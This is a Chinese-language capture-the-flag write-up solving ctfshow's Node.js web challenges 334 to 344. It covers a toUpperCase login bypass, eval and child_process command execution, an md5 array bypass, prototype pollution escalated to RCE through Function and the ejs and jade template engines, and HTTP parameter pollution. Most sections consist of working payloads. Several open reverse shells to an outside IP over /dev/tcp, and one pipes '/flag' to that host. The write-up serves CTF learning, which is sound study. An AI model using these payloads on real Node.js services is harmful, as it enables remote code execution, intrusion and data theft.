---
title: ctfshow-nodejs
id: ctfshow-nodejs
---

<!-- more -->


[Node.js 常见漏洞学习与总结 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/7184)

## 334 js大小写函数

下载源码：

```js
# user.js
module.exports = {
  items: [
    {username: 'CTFSHOW', password: '123456'}
  ]
};
```

```js
# login.js
var express = require('express');
var router = express.Router();
var users = require('../modules/user').items;
 
var findUser = function(name, password){
  return users.find(function(item){
    return name!=='CTFSHOW' && item.username === name.toUpperCase() && item.password === password;
  });
};

/* GET home page. */
router.post('/', function(req, res, next) {
  res.type('html');
  var flag='flag_here';
  var sess = req.session;
  var user = findUser(req.body.username, req.body.password);
 
  if(user){
    req.session.regenerate(function(err) {
      if(err){
        return res.json({ret_code: 2, ret_msg: '登录失败'});        
      }
       
      req.session.loginUser = user.username;
      res.json({ret_code: 0, ret_msg: '登录成功',ret_flag:flag});              
    });
  }else{
    res.json({ret_code: 1, ret_msg: '账号或密码错误'});
  }  
  
});

module.exports = router;

```

要以账户ctfshow，密码123456登录
考察的地方是

```
toUpperCase()是javascript中将小写转换成大写的函数。
toLowerCase()是javascript中将大写转换成小写的函数
除此之外
在Character.toUpperCase()函数中，字符ı会转变为I，字符ſ会变为S。
在Character.toLowerCase()函数中，字符İ会转变为i，字符K会转变为k。
```

详细看：[Fuzz中的javascript大小写特性 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html)
那么输入ctfſhow 123456即可

## 335 rce

f12提示`<!-- /?eval= -->`

直接执行命令即可

chile_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令
用`child_process`模块的`exec`和`execSync`或者`spawn`与`spawnSync`

```js
/?eval=require('child_process').execSync('ls').toString()
/?eval=require('child_process').execSync('cat fl00g.txt').toString()
```

```js
require('child_process').spawnSync('ls',['./']).stdout.toString()
require('child_process').spawnSync('cat',['fl00g.txt']).stdout.toString()
```

还可以用这个：

```js
global.process.mainModule.constructor._load('child_process').execSync('ls',['.']).toString()
```



## 336 过滤rce

过滤了exec，只能用spawnSync啦

```js
require('child_process').spawnSync('ls',['./']).stdout.toString()
require('child_process').spawnSync('cat',['fl001g.txt']).stdout.toString()
```



## 337 md5绕过

> ```js
> var express = require('express');
> var router = express.Router();
> var crypto = require('crypto');
> 
> function md5(s) {
> return crypto.createHash('md5')
>  .update(s)
>  .digest('hex');
> }
> 
> /* GET home page. */
> router.get('/', function(req, res, next) {
> res.type('html');
> var flag='xxxxxxx';
> var a = req.query.a;
> var b = req.query.b;
> if(a && b && a.length===b.length && a!==b && md5(a+flag)===md5(b+flag)){
> 	res.end(flag);
> }else{
> 	res.render('index',{ msg: 'tql'});
> }
> 
> });
> 
> module.exports = router;
> ```
>
> 要求a和b长度相等，内容不同但其md5值相同

数组绕过，js中两个数组是不能直接用===判断相等的：

```
?a[a]=1&b[a]=2
```

```
执行如下代码：那么下面的结果都会是[object Object]flag{xxx}，其md5也就一样了
a={'a':'1'}
b={'a':'2'}

console.log(a+"flag{xxx}")
console.log(b+"flag{xxx}")
```



## 338 原型链污染

> 下载源码：
>
> routes/login.js
>
> ```js
> var flag='flag_here';
> var secert = {};
> var sess = req.session;
> let user = {};
> utils.copy(user,req.body);
> if(secert.ctfshow==='36dboy'){
>  res.end(flag);
> }
> ```
>
> utils/common.js
>
> ```js
> function copy(object1, object2){
>  for (let key in object2) {
>      if (key in object2 && key in object1) {
>          copy(object1[key], object2[key])
>      } else {
>          object1[key] = object2[key]
>      }
>  }
> }
> ```
>
> 只需secert的ctfshow属性=36dboy即可获得flag
> 再看跟踪到copy方法，可以利用原型链污染

![](https://i.loli.net/2021/09/07/qEbjuS4e3rYRZBd.png)

此处`secert`为数组，而`copy`方法的操作对象也是数组，那么利用`post`请求将`req.body`传入参数，再利用`user`污染数组原型，则当`secert`找不到`ctfshow`属性时就会往原型找，从而使得判断条件为真

payload：

```json
{"__proto__":{"ctfshow":"36dboy"}}
```

抓包，点击登录，然后将帐号密码的数据改为payload传入即可
![](https://i.loli.net/2021/09/08/dsagS63pNKHkUXE.png)



## 339 原型链污染+

> routes/login.js
>
> ```js
> var flag='flag_here';
> var secert = {};
> var sess = req.session;
> let user = {};
> utils.copy(user,req.body);
> if(secert.ctfshow===flag){
>  res.end(flag);
> }
> ```
>
> 因为不知道flag，因此secert.ctfshow===flag就难以实现了
>
> 可以看到多了一个api.js
>
> ```js
> router.post('/', require('body-parser').json(),function(req, res, next) {
> res.type('html');
> res.render('api', { query: Function(query)(query)});
> 
> });
> ```
>
> 可以通过参数污染控制query

预期解：

```js
function copy(object1, object2){
   for (let key in object2) {
       if (key in object2 && key in object1) {
           copy(object1[key], object2[key])
       } else {
           object1[key] = object2[key]
       }
   }
 }
var user ={}
body=JSON.parse('{"__proto__":{"query":"return 111"}}');
copy(user,body)
console.log(query)
```

运行如上代码可以看到，query的值从"return 111"变为111

![](https://i.loli.net/2021/09/06/sNXoPb8n6SuTJVG.png)

query之所以会改变，是由于原型链污染，js中所有对象的原型都可以被继承到object，而其继承的终点是null对象

![](https://i.loli.net/2021/09/06/aPolLx9OJricbGH.png)

同样的在找不到对应对象/属性时，会遍历object

![](https://i.loli.net/2021/09/06/UrLy6MQGxRZcbY1.png)

因此由于调用`copy`方法时，原型链被污染，导致`query`的值为`"return 111"`

![](https://i.loli.net/2021/09/06/D1BVoJLWEgIQcu9.png)

然后我们会发现`{ query: Function(query)(query)}`为`{ query: 111 }`
也就是`Function(query)(query)=111`

原因如下：

> 每个 JavaScript 函数实际上都是一个 `Function` 对象。运行 `(function(){}).constructor === Function // true` 便可以得到这个结论。

语法：

```js
new Function ([arg1[, arg2[, ...argN]],] functionBody)
```

如下，一个小尝试

![](https://i.loli.net/2021/09/06/T6dqhZQStA5iKIx.png)

那么同理

![](https://i.loli.net/2021/09/07/St7hyHp9DuCr6kN.png)

由此可以控制api中的`{ query: Function(query)(query)}`从而实现rce

那么本题的思路就是利用copy函数进行原型链污染，再利用api.js来rce
这里可以弹个shell从而获取flag

payload：

```json
{"__proto__":{"query":"return global.process.mainModule.constructor._load('child_process').exec('bash -c \"bash -i >& /dev/tcp/119.3.217.40/6666 0>&1\"')"}}
```

![](https://i.loli.net/2021/09/07/vJktSTeshuY8zj1.png)

![](https://i.loli.net/2021/09/07/yt5YfMHKZAi4Rsw.png)

然后在vps上nc监听：(ps:使用vps的话，要在安全组选项配置好端口的出入规则--)

```sh
nc -lnvp 6666
```

flag:![](https://i.loli.net/2021/09/07/Q81k2r5pbq7inMc.png)



## 340 原型链污染++

> 下载源码：
> 看关键部分：
>
> ```js
> var flag='flag_here';
> var user = new function(){
>  this.userinfo = new function(){
>  this.isVIP = false;
>  this.isAdmin = false;
>  this.isAuthor = false;     
>  };
> }
> utils.copy(user.userinfo,req.body);
> if(user.userinfo.isAdmin){
> res.end(flag);
> }
> ```
>
> 还是利用copy函数进行原型链污染，但可以看到user.info的原型不是object，而是user
> 即`user.info.__proto__.__proto__`才是object

其实和339一样，就是需要套两层`__proto__`才能污染到object对象
可以本地试一下：

```js
function copy(object1, object2){
    for (let key in object2) {
        if (key in object2 && key in object1) {
            copy(object1[key], object2[key])
        } else {
            object1[key] = object2[key]
        }
    }
  }

var user = new function(){
    this.userinfo = new function(){
    this.isVIP = false;
    this.isAdmin = false;
    this.isAuthor = false;     
    };
  }

body=JSON.parse('{"__proto__":{"__proto__":{"query":"hhh"}}}');
copy(user.userinfo,body);
user.userinfo
user.query
```

![](https://i.loli.net/2021/09/07/59lL4meZIfpxs7H.png)

payload:

```json
{"__proto__":{"__proto__":{"query":"return global.process.mainModule.constructor._load('child_process').exec('bash -c \"bash -i >& /dev/tcp/119.3.217.40/6666 0>&1\"')"}}}
```

还是反弹shell



## 341 ejs rce

> 下载源码会发现api.js没了

发现一个很好用的工具[Snyk](https://support.snyk.io/hc/en-us/articles/360003812538-Install-the-Snyk-CLI)，像这种源码包可以丢给他直接检测![](https://i.loli.net/2021/09/07/pt4VBHiGWsvkyqZ.png)

可以看到检测到一个ejs模板引擎的原型链污染RCE：
[XNUCA2019 Hardjs题解 从原型链污染到RCE - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/6113)
[几个node模板引擎的原型链污染分析 | L0nm4r (lonmar.cn)](https://lonmar.cn/2021/02/22/几个node模板引擎的原型链污染分析/#gallery-10)
网上的exp：

```json
{"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/xxx/6666 0>&1\"');var __tmp2"}}

{"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require(\'child_process\').exec(\'hhh\');var __tmp2"}}
```

这里修改一下，还是像340，两层污染：

```json
{"__proto__":{"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/119.3.217.40/6666 0>&1\"');var __tmp2"}}}
```

![](https://i.loli.net/2021/09/07/pvqmhELNiFczb7G.png)

然后随便访问一个页面就能触发rce

![](https://i.loli.net/2021/09/07/T6Sh5BisDN8F3ap.png)

flag在根目录下
![](https://i.loli.net/2021/09/07/NM3kY1iypc6wnQK.png)

## 342 、343 jade原型链污染

> Hint：审计了1个小时发现的，此链目前网上未公开，难度稍大

jade原型链污染：[再探 JavaScript 原型链污染到 RCE - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/7025)
本题和上文链接稍有不同，是群主当时发现的未公开链子，当然现在这么久也已经公开了

分析可以看：
[几个node模板引擎的原型链污染分析 | L0nm4r (lonmar.cn)](https://lonmar.cn/2021/02/22/几个node模板引擎的原型链污染分析/)
[ctfshow nodejs篇 - TARI TARI](https://tari.moe/2021/05/04/ctfshow-nodejs/)

看完可以知道，jade本身是没有漏洞的，但原型链污染的存在再加上模版渲染就出现了漏洞

payload：

```json
{"__proto__":{"__proto__":{"compileDebug":1,"type":"Code","self":1,"title":"tari","line":"global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/119.3.217.40/6666>&1\"')"}}}
```

重点是content-type要改为application/json，然后发两次包，一次污染，一次触发就可以rce
![](https://i.loli.net/2021/09/08/Fb7xMTtJVWEqv38.png)

但是发现弹的shell卡住了，只能一条条命令的执行：

```json
{"__proto__":{"__proto__": {"type":"Block","nodes":"","compileDebug":1,"self":1,"line":"global.process.mainModule.require('child_process').exec('bash -c \"cat /flag >& /dev/tcp/119.3.217.40/6666>&1\"')"}}}
```

![](https://i.loli.net/2021/09/08/Oo7Ais9UDraIdvM.png)

343过滤了一些东西，但是上面的payload还是可以打通，感兴趣可以看一下源码



## 344 HPP

> ```js
> router.get('/', function(req, res, next) {
> res.type('html');
> var flag = 'flag_here';
> if(req.url.match(/8c|2c|\,/ig)){
> 	res.end('where is flag :)');
> }
> var query = JSON.parse(req.query.query);
> if(query.name==='admin'&&query.password==='ctfshow'&&query.isVIP===true){
> 	res.end(flag);
> }else{
> 	res.end('where is flag. :)');
> }
> 
> });
> ```
>
> 存在过滤： url 中不能包含大小写的 `8c`、`2c` 和 `,逗号`

正常来说，我们只需要传入：

```json
?query={"name":"admin","password":"ctfshow","isVIP":"true"}
```

但过滤了逗号和其url编码格式，%2c

> 考虑http协议中是允许同名参数多次出现的，只是不同的服务端对同名参数的处理不同
>
> | Web服务器        | 参数获取函数                | 获取到的参数                 |
> | ---------------- | --------------------------- | ---------------------------- |
> | PHP/Apache       | $_GET(“par”)                | Last                         |
> | JSP/Tomcat       | Request.getParameter(“par”) | First                        |
> | Perl(CGI)/Apache | Param(“par”)                | First                        |
> | Python/Apache    | getvalue(“par”)             | All(List)                    |
> | ASP/IIS          | Request.QueryString(“par”)  | All (comma-delimited string) |

nodejs 会把同名参数以数组的形式存储，并且 `JSON.parse` 可以正常解析。

payload：

```json
?query={"name":"admin"&query="password":"%63tfshow"&query="isVIP":true}
```

nodejs中会把这三部分拼接起来
把ctfshow中的c编码是因为双引号的url编码是%22再和c连接起来是%22c，会匹配2c



